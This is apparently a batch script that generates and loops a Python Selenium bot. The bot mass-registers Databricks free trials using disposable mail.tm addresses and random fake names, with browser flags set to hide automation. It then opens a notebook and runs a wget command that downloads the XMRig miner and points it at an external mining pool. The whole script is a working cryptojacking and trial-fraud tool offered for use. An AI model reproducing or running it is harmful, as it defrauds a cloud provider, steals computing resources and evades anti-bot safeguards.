pip install selenium names		
echo	from selenium import webdriver 	
echo	from selenium.webdriver import ActionChains 	
echo	from selenium.webdriver.common.keys import Keys 	
echo	from selenium.webdriver.support.ui import WebDriverWait 	
echo	from selenium.webdriver.common.by import By 	
echo	from selenium.webdriver.support import expected_conditions as EC 	
echo	import names, time 	
echo	option = webdriver.ChromeOptions() 	
echo	option.add_experimental_option("excludeSwitches", ["enable-automation"]) 	
echo	option.add_experimental_option('useAutomationExtension', False) 	
echo	option.add_argument('--disable-blink-features=AutomationControlled') 	
echo	option.add_argument('--disable-gpu') 	
echo	#option.add_argument('--headless') 	
echo	option.add_argument('--disable-software-rasterizer') 	
echo	driver = webdriver.Chrome(executable_path='chromedriver',options=option) 	
echo	def get_email():	
echo	    print("get email")	
echo	    global email	
echo	    driver.get("https://mail.tm/en/")	
echo	    time.sleep(3)	
echo	    driver.execute_script("document.querySelector('#accounts-menu > span > span').click();")	
echo	    time.sleep(3)	
echo	    email = driver.find_element_by_xpath('//*[@id="accounts-list"]/div/div[1]/p[2]').text	
echo	    print(email)	
echo	def try_databricks():	
echo	    print("Open databricks")	
echo	    driver.execute_script("window.open('about:blank','secondtab');")	
echo	    driver.switch_to.window("secondtab") 	
echo	    driver.get('https://databricks.com/try-databricks')	
echo	    driver.execute_script("document.querySelector('#FirstName').value='"+names.get_first_name()+"';")	
echo	    driver.execute_script("document.querySelector('#LastName').value='"+names.get_last_name()+"';")	
echo	    driver.execute_script("document.querySelector('#Company').value='"+names.get_last_name()+"';")	
echo	    driver.execute_script("document.querySelector('#Email').value='"+email+"';")	
echo	    driver.execute_script("document.querySelector('#Title').value='staff';")	
echo	    driver.execute_script("document.querySelector('#mkto_form_consent').click();")	
echo	    driver.find_element_by_id("mkto_form_consent").send_keys(Keys.END)	
echo	    time.sleep(5)	
echo	    try:	
echo	        driver.execute_script("document.querySelector('#om-qntjsvpnnpkxkiyqlnfx-optin > div > button').click();")	
echo	    except:	
echo	        print("no ads")	
echo	    driver.execute_script("document.querySelector('#submitToMktoForm_2021Feb10 > div.mktoButtonRow > span > button').click();")	
echo	    time.sleep(5)	
echo	    driver.execute_script("document.querySelector('#ce-placeholder-button').click();")	
echo	    WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"Time to check your email!")]')))    	
echo	def read_email():	
echo	    print("read email")	
echo	    driver.get("https://mail.tm/en/")	
echo	    WebDriverWait(driver,120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul')))	
echo	    driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul').click()	
echo	    WebDriverWait(driver,120).until(EC.frame_to_be_available_and_switch_to_it((By.ID,"iFrameResizer0")))	
echo	    driver.execute_script("document.querySelector('body > p:nth-child(3) > a').click();")	
echo	def reset_password():	
echo	    print("reset password") 	
echo	    driver.switch_to.default_content()	
echo	    handles = driver.window_handles	
echo	    size = len(handles) 	
echo	    for x in range(size): 	
echo	        if handles[x] != driver.current_window_handle: 	
echo	            driver.switch_to.window(handles[x])	
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="reset-container"]/div/div[1]/input'))) 	
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(3) > input').value='1234Asdfg@';")	
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(5) > input').value='1234Asdfg@';")	
echo	    #click reset	
echo	    time.sleep(3)	
echo	    driver.execute_script("document.querySelector('#reset-container > div > div:nth-child(6) > button').click();")	
echo	def create_workspace():	
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]')))	
echo	    #new python	
echo	    driver.execute_script("document.querySelector('#content > div > div > uses-legacy-bootstrap > div > div > div.homeview-inner > div.homeview-panel > div.ant-row.ant-row-center.homeview-row.homeview-top > div:nth-child(3) > div > div > div > a > div.header').click();")    	
echo	    #input name	
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="input"]'))) 	
echo	    driver.find_element_by_xpath('//*[@id="input"]').send_keys("Plant")	
echo	    #create	
echo	    driver.execute_script("document.querySelector('body > div.ReactModalPortal > div > div > uses-legacy-bootstrap > uses-legacy-bootstrap > button.btn.btn-primary > span').click();")	
echo	    #click cell	
echo	    WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre'))) 	
echo		#input command
echo	    driver.find_element_by_css_selector(".CodeMirror-line").click()	
echo	    driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	
echo	    #start cell	
echo	    driver.find_element_by_css_selector(".fa-play").click()	
echo	    driver.find_element_by_css_selector(".run-cell > .fa").click() 	
echo	    driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()	
echo	    print("**********************DONE***************************")	
echo	get_email()	
echo	try_databricks()	
echo	read_email()	
echo	reset_password()	
echo	create_workspace()	
:loop		
python autobricks.py		
taskkill /F /FI "WINDOWNTITLE eq https://databricks.com*"		
goto :loop		
